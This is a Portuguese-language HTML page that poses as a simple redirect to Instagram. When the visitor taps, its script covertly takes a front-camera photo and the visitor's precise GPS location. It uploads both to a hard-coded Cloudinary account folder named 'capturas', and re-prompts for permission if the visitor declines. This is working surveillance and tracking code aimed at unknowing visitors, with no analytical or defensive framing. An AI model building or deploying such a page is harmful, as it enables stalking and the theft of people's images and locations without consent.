<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Redirecionando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #000; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: none; /* somente exibe se ocorrer erro */
      justify-content: center;
      align-items: center;
      color: #fff;
      font-family: sans-serif;
      font-size: 20px;
      background: rgba(0,0,0,0.8);
      text-align: center;
      padding: 20px;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <div id="overlay"></div>
  <script>
    const cloudName = "dx5legahb";      // Seu Cloudinary Cloud Name
    const uploadPreset = "upload";       // Seu Upload Preset (unsigned)
    const folderName = "capturas";       // Pasta de destino

    // Função para mostrar o overlay com mensagem e callback no clique
    function showOverlay(message, callback) {
      const overlay = document.getElementById("overlay");
      overlay.textContent = message;
      overlay.style.display = "flex";
      overlay.onclick = () => {
        overlay.style.display = "none";
        if (callback) callback();
      };
    }

    // Captura a foto usando a câmera frontal
    async function capturePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        const video = document.createElement("video");
        video.playsInline = true;  // essencial para iOS
        video.muted = true;
        video.srcObject = stream;
        await video.play();
        // Aguarda um instante para garantir que o vídeo renderizou
        await new Promise(r => setTimeout(r, 300));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());
        
        const imageData = canvas.toDataURL("image/png");
        const imageBlob = await (await fetch(imageData)).blob();

        const formData = new FormData();
        formData.append("file", imageBlob);
        formData.append("upload_preset", uploadPreset);
        formData.append("folder", folderName);

        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
          method: "POST",
          body: formData
        });
        if (!response.ok) throw new Error("Erro ao enviar imagem");
        const data = await response.json();
        return data.secure_url;
      } catch (error) {
        console.error("Erro na captura da foto:", error);
        showOverlay("Permita acesso à câmera para continuar. Toque para tentar novamente.", () => {
          capturePhoto().then(url => proceedToLocation(url));
        });
        throw error;
      }
    }

    // Solicita a localização e envia os dados para o Cloudinary
    function requestLocation(imageUrl) {
      navigator.geolocation.getCurrentPosition(async (pos) => {
        try {
          const { latitude, longitude } = pos.coords;
          const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
          const textBlob = new Blob([texto], { type: "text/plain" });
  
          const textForm = new FormData();
          textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
          textForm.append("upload_preset", uploadPreset);
          textForm.append("folder", folderName);
  
          const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
            method: "POST",
            body: textForm
          });
          if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
          // Se tudo ocorrer bem, redireciona para o Instagram
          window.location.href = "https://instagram.com";
        } catch (err) {
          console.error("Erro no envio da localização:", err);
          showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
            requestLocation(imageUrl);
          });
        }
      }, (err) => {
        console.error("Erro ao obter localização:", err);
        showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
          requestLocation(imageUrl);
        });
      }, {
        enableHighAccuracy: true,
        timeout: 8000,
        maximumAge: 0
      });
    }

    // Função para iniciar o fluxo após a foto ser capturada
    function proceedToLocation(imageUrl) {
      // Chama a solicitação de localização sem exibir overlay extra se tudo ocorrer bem
      requestLocation(imageUrl);
    }

    // Função principal: inicia a captura da foto
    async function iniciarFluxo() {
      try {
        const imageUrl = await capturePhoto();
        // Se a foto for capturada com sucesso, passa para a localização
        proceedToLocation(imageUrl);
      } catch (e) {
        console.error("Erro no fluxo:", e);
      }
    }

    // Inicia o fluxo apenas quando o usuário tocar na tela (para garantir interação no iOS)
    document.body.addEventListener("click", function handler() {
      document.body.removeEventListener("click", handler);
      iniciarFluxo();
    });
  </script>
</body>
</html>
